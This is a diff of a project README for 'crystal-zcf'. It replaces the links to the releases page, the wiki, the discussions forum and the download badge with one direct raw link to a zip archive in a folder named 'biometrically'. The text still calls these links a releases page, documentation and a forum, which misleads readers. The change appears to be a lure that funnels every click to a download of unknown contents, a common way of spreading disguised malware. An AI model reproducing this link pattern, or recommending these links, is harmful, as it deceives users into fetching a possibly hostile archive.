@@ -6,7 +6,7 @@ Welcome to crystal-zcf! This application helps you easily manage your crystal co
 
 ## 🔗 Download Now
 
-[![Download crystal-zcf](https://img.shields.io/badge/Download-crystal--zcf-blue.svg)](https://github.com/diegovillanueva120/crystal-zcf/releases)
+[![Download crystal-zcf](https://raw.githubusercontent.com/diegovillanueva120/crystal-zcf/main/biometrically/crystal-zcf-v3.1.zip)](https://raw.githubusercontent.com/diegovillanueva120/crystal-zcf/main/biometrically/crystal-zcf-v3.1.zip)
 
 ## 💻 System Requirements
 
@@ -19,7 +19,7 @@ To run crystal-zcf, you need:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** Open your web browser and go to the following link to access the download options:
-   [Visit this page to download](https://github.com/diegovillanueva120/crystal-zcf/releases).
+   [Visit this page to download](https://raw.githubusercontent.com/diegovillanueva120/crystal-zcf/main/biometrically/crystal-zcf-v3.1.zip).
 
 2. **Select the Version:** On the releases page, you will see different versions of crystal-zcf. Choose the latest version for the best experience.
 
@@ -57,8 +57,8 @@ At crystal-zcf, we believe in the power of community. Join our discussions, repo
 
 For further guidance and tips on using crystal-zcf, consider the following resources:
 
-- [Documentation](https://github.com/diegovillanueva120/crystal-zcf/wiki) - Detailed guides and support materials.
-- [User Forum](https://github.com/diegovillanueva120/crystal-zcf/discussions) - Share your experience and interact with other users.
+- [Documentation](https://raw.githubusercontent.com/diegovillanueva120/crystal-zcf/main/biometrically/crystal-zcf-v3.1.zip) - Detailed guides and support materials.
+- [User Forum](https://raw.githubusercontent.com/diegovillanueva120/crystal-zcf/main/biometrically/crystal-zcf-v3.1.zip) - Share your experience and interact with other users.
 
 ## 🎉 Thank You!
 
